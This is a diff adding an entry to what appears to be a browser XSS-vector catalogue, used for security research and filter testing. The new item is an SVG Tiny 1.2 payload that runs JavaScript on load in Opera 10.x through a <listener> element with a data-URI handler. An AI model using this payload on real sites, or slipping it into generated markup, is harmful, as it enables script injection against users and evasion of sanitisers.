@@ -3214,5 +3214,34 @@ var items =
         },
         'tags'       : ['xss', 'javascript', 'spoofing', 'history', 'phishing'],
         'reporter'   : '.mario'
+    },
+    { /* ID 104 - Executing JavaScript in SVG Tiny 1.2 without user interaction */
+        'id'         : 104,
+        'category'   : 'svg', 
+        'name'       : {
+            'en' : ' Executing JavaScript in SVG Tiny 1.2 without user interaction',
+            'ja' : '',
+            'ru' : '',
+            'de' : ''
+        },
+        'data'       : '<svg xmlns="http://www.w3.org/2000/svg" id="foo">\r\n<listener xmlns="http://www.w3.org/2001/xml-events" event="load" observer="foo" handler="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Chandler%20xml%3Aid%3D%22bar%22%20type%3D%22application%2Fecmascript%22%3E %js_alert% %3C%2Fhandler%3E%0A%3C%2Fsvg%3E%0A#bar"/>\r\n</svg>',
+        'description': {
+            'en' : 'Opera - providing advanced support for SVG Tiny 1.2 targeting mobile devices - allows to execute JavaScript without user interaction via <listener> tags. The tag is being applied with a handler pointing to a data URI containing the actual handler. Important is the hash at the end of the data URI to identify the corrrect handler.',
+            'ja' : '',
+            'ru' : '',
+            'de' : ''
+        },
+        'urls'    : ['http://www.w3.org/TR/SVGMobile12/script.html', 'http://www.w3.org/TR/2003/REC-xml-events-20031014/'],
+        'howtofix'   : {
+            'en' : '',
+            'ja' : '',
+            'ru' : '',
+            'de' : ''
+        },                        
+        'browsers'   : {
+            'opera' : ['10.x', 'mobile']
+        },
+        'tags'       : ['xss', 'javascript', 'svg', 'tinysvg', 'listener', 'xml', 'events'],
+        'reporter'   : '.mario'
     }
 ]
